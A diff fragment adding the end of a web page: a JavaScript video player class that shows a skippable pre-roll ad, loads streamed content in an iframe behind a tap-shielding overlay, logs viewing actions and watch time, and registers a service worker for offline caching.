+      this.adContainer = document.getElementById('adContainer');
+      this.adMediaContainer = document.getElementById('adMediaContainer');
+      this.skipBtn = document.getElementById('skipBtn');
+      this.touchCatcher = document.getElementById('touchCatcher');
+      this.smartOverlay = document.getElementById('smartOverlay');
+      this.uiBackBtn = document.getElementById('uiBackBtn');
+      
+      this.uiBackBtn.addEventListener('click', () => this.close());
+      this.touchCatcher.addEventListener('touchstart', (e) => {
+          let now = Date.now();
+          this.smartOverlay.classList.add('active');
+          clearTimeout(this.uiTimer);
+          this.uiTimer = setTimeout(() => { this.smartOverlay.classList.remove('active'); }, 3500);
+
+          if (now - this.lastTap < 400) { e.preventDefault(); return; }
+          this.lastTap = now;
+          this.touchCatcher.style.pointerEvents = 'none';
+          clearTimeout(this.shieldRestoreTimer);
+          this.shieldRestoreTimer = setTimeout(() => { this.touchCatcher.style.pointerEvents = 'auto'; }, 150);
+      }, {passive: false});
+    }
+
+    async open(url, title, vidId) {
+      this.currentVidId = vidId; this.currentTitle = title; this.sessionStartTime = Date.now();
+      document.body.style.overflow = 'hidden'; document.body.style.touchAction = 'none';
+      this.modal.style.display = 'flex';
+      document.getElementById('overlayTitle').innerText = title;
+      logAction(`Started Playing: ${title}`);
+
+      if (activeAd && activeAd.enabled && activeAd.url) { this.playAd(url); } else { this.playMainContent(url); }
+      
+      try {
+        if (this.modal.requestFullscreen) await this.modal.requestFullscreen();
+        if (screen.orientation && screen.orientation.lock) await screen.orientation.lock('landscape').catch(e=>{});
+      } catch (err) {}
+    }
+
+    playAd(mainUrl) {
+        this.iframeContainer.style.display = 'none'; this.adContainer.style.display = 'flex';
+        this.skipBtn.style.display = 'block'; this.skipBtn.classList.add('disabled');
+        let skipTime = parseInt(activeAd.skipTime) || 5; this.skipBtn.innerText = `Skip Ad (${skipTime})`;
+        this.adMediaContainer.innerHTML = '';
+
+        if (activeAd.type === 'image') { 
+            this.adMediaContainer.innerHTML = `<img src="${activeAd.url}" style="max-width:100%; max-height:100%; object-fit:contain;">`; 
+        } else if (activeAd.type === 'video') { 
+            this.adMediaContainer.innerHTML = `<video id="nativeAdVideo" src="${activeAd.url}" autoplay muted playsinline style="max-width:100%; max-height:100%; object-fit:contain;"></video>`; 
+            setTimeout(() => { const v = document.getElementById('nativeAdVideo'); if(v) v.play().catch(e => console.log(e)); }, 150);
+        } else if (activeAd.type === 'youtube') {
+            let match = activeAd.url.match(/(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))([^&?]+)/);
+            let ytId = match ? match[1] : activeAd.url.split('/').pop();
+            this.adMediaContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${ytId}?autoplay=1&mute=1&controls=0&playsinline=1&rel=0" width="100%" height="100%" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`;
+        }
+
+        this.adInterval = setInterval(() => {
+            skipTime--;
+            if (skipTime <= 0) {
+                clearInterval(this.adInterval); this.skipBtn.innerText = "Skip Ad ➔";
+                this.skipBtn.classList.remove('disabled'); 
+                this.skipBtn.onclick = () => { logAction("Skipped Ad"); this.playMainContent(mainUrl); };
+            } else { this.skipBtn.innerText = `Skip Ad (${skipTime})`; }
+        }, 1000);
+    }
+
+    playMainContent(url) {
+        this.adContainer.style.display = 'none'; this.iframeContainer.style.display = 'block';
+        if(this.adMediaContainer) this.adMediaContainer.innerHTML = '';
+        if (url.includes('hdhub4u')) { url = url + '&no-ads=true&hide-controls=true'; }
+        this.iframePlayer.src = url;
+        this.touchCatcher.style.pointerEvents = 'auto'; 
+        this.smartOverlay.classList.add('active');
+        clearTimeout(this.uiTimer);
+        this.uiTimer = setTimeout(() => { this.smartOverlay.classList.remove('active'); }, 3500);
+    }
+
+    close() {
+      this.modal.style.display = 'none'; document.body.style.overflow = ''; document.body.style.touchAction = '';
+      this.iframePlayer.src = ''; clearInterval(this.adInterval);
+      this.smartOverlay.classList.remove('active');
+      clearTimeout(this.uiTimer); clearTimeout(this.shieldRestoreTimer);
+      if(this.sessionStartTime && this.currentVidId) {
+          let duration = Math.floor((Date.now() - this.sessionStartTime) / 1000);
+          logAction(`Closed Player: ${this.currentTitle} (Watched ${duration}s)`);
+          logWatchHistory(this.currentVidId, this.currentTitle, duration);
+      }
+      if (document.fullscreenElement) { if(document.exitFullscreen) document.exitFullscreen(); }
+      if (screen.orientation && screen.orientation.unlock) { screen.orientation.unlock(); }
+    }
+  }
+  const player = new SecureVideoPlayer();
+
+</script>
+
+<script>
+  // Service Worker Registration for Offline Cache
+  if ('serviceWorker' in navigator) {
+    window.addEventListener('load', () => {
+      navigator.serviceWorker.register('/sw.js')
+        .then((registration) => { console.log('Site successfully saved to browser for offline use!'); })
+        .catch((error) => { console.log('Failed to save site: ', error); });
+    });
+  }
+</script>
+
+</body>
+</html>
+
